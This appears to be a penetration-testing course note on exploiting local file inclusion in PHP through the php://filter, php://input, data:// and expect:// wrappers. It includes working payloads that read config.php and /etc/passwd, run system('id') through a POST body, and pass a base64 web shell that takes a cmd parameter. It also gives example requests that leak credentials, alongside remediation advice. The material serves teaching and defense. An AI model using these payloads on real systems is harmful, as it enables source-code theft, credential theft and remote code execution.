---
tags: [vapt, lfi, php, intermediate, rce]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.06 LFI via PHP Wrappers (php://filter, php://input, data://)"
---

# 23.06 — LFI via PHP Wrappers (`php://filter`, `php://input`, `data://`)

## What is it?
PHP comes with built-in "wrappers" (stream protocols) that allow it to interact with various data sources as if they were standard files. When an application has a Local File Inclusion (LFI) vulnerability (e.g., using `include($_GET['page'])`), an attacker can abuse these wrappers to extract source code without executing it, or to execute arbitrary code directly from the HTTP request, completely bypassing the need to upload a payload to the server's disk.

- **`php://filter`**: Allows an attacker to apply a filter (like Base64 encoding) to a file *before* PHP includes it. This prevents PHP from executing the file, allowing the attacker to read the raw backend source code (e.g., to steal database passwords).
- **`php://input`**: Reads raw data from the HTTP POST body. If `allow_url_include` is enabled in `php.ini`, an attacker can send PHP code in the POST body, and the server will execute it instantly.
- **`data://`**: Similar to `php://input`, it allows an attacker to pass Base64-encoded PHP code directly in the URL parameter.

Think of it like a magical translation device. Normally, if you feed the web server a PHP file, it executes the code. But by using `php://filter`, you're telling the server, "Translate this document into another language (Base64) before you look at it." Since the server doesn't understand Base64 as code, it just hands you the translated text, allowing you to decode it and read the original instructions.

## ASCII Diagram
```text
[Scenario A: Reading Source Code with php://filter]
[Attacker Payload] ──>  php://filter/convert.base64-encode/resource=config.php
       │
[PHP include()]
       │
       ├─ Fetches config.php
       ├─ Encodes it to Base64 (PD9waHAgZWNobyAiZGIi...=)
       ├─ Tries to execute it. It's not valid PHP tags!
       │
[Response] ──> Returns raw Base64 string to attacker. (Source Code Stolen!)

-----------------------------------------------------------

[Scenario B: RCE with php://input]
[Attacker Request]
POST /index.php?page=php://input
Body: <?php system('whoami'); ?>
       │
[PHP include()]
       │
       ├─ Reads the POST body
       ├─ Executes: <?php system('whoami'); ?>
       │
[Response] ──> www-data (RCE Achieved instantly!)
```

## How to Find It
- **Manual steps:**
  1. Identify an LFI parameter (`?page=`).
  2. To test `php://filter`: Supply the payload `php://filter/convert.base64-encode/resource=index.php`.
  3. If the page returns a massive Base64 string, copy it, decode it locally, and verify it contains the raw PHP source code of `index.php`.
  4. To test `php://input` (Requires `allow_url_include = On`): Change the request method to POST. Set the parameter to `?page=php://input`. Put `<?php echo "VULNERABLE"; ?>` in the request body. If the response contains "VULNERABLE", you have RCE.

- **Tool commands with flags explained:**
  To quickly decode the stolen source code via terminal:
  ```bash
  echo "PD9waHAgLi4u" | base64 -d
  ```

## How to Exploit It
- **Step-by-step walkthrough (Stealing Source Code):**
  1. Identify the LFI.
  2. Use `php://filter/convert.base64-encode/resource=<target_file>`.
  3. The `target_file` can be a local path (`../../../var/www/html/config.php`) or a relative file in the current directory (`config.php`).
  4. The server will output the Base64 representation of the file.
  5. Decode the Base64 to reveal hardcoded credentials or business logic.

- **Actual payloads:**
  **Source Code Disclosure (`php://filter`):**
  ```text
  php://filter/read=convert.base64-encode/resource=admin.php
  php://filter/convert.base64-encode/resource=../../../../etc/passwd
  ```
  **Direct RCE (`php://input`):**
  ```http
  POST /view.php?page=php://input
  Body: <?php system('id'); ?>
  ```
  **Direct RCE (`data://` wrapper):**
  ```text
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
  # (Decodes to: <?php system($_GET['cmd']); ?>)
  ```
  **Direct RCE (`expect://` wrapper - rare, requires expect module):**
  ```text
  expect://id
  ```

- **Real HTTP request/response examples:**
  **Exploit Request (Filter):**
  ```http
  GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
  Host: target.com
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  
  PD9waHAKJGRiX3VzZXIgPSAiYWRtaW4iOwokZGJfcGFzcyA9ICJzZWNyZXRQYXNzMTIzIjsKPz4K
  ```
  *(Decoding the Base64 reveals: `<?php $db_user = "admin"; $db_pass = "secretPass123"; ?>`)*

## Real-World Example
In a CTF/Boot2Root machine, the attacker found an LFI in `download.php?file=`. Normal path traversal worked, but they couldn't read `admin.php` because the server executed it instead of returning the text. They changed the payload to `?file=php://filter/convert.base64-encode/resource=admin.php`. The server returned the Base64 representation of the `admin.php` source code. Upon decoding it, the attacker found the hardcoded MySQL database password, which they then used to log into the database and elevate their privileges.

## How to Fix It
- **Developer remediation:**
  Do not allow dynamic file inclusion based on user input. Use an explicit allowlist mapping. Additionally, harden the PHP environment:
  1. Set `allow_url_include = Off` in `php.ini`. This completely prevents `php://input` and `data://` from being used in `include()` or `require()`.
  2. While `allow_url_include = Off` stops RCE wrappers, it **does not** stop `php://filter`. Only strict input validation/allowlisting stops `php://filter`.

- **Code snippet:**
  **PHP (Dangerous vs Safe):**
  ```php
  // DANGEROUS: Susceptible to ALL wrappers
  include($_GET['page']);
  
  // SAFE: Strict ID mapping
  $pages = [
      '1' => 'home.php',
      '2' => 'about.php'
  ];
  
  $selection = $_GET['id'];
  if (array_key_exists($selection, $pages)) {
      include($pages[$selection]);
  }
  ```

## Chaining Opportunities
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → Use `php://filter` to read `db.php`, `.env`, or `config.inc.php`. Extract the database credentials to log into PhpMyAdmin or establish a direct SQL connection.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → If the web application allows you to write files (e.g., a "save draft" feature), save your payload to a local file, then use `php://filter` to execute or encode it, depending on your goals.

## Related Notes
- [[05 - Local File Inclusion (LFI)]]
- [[10 - Remote File Inclusion (RFI)]]
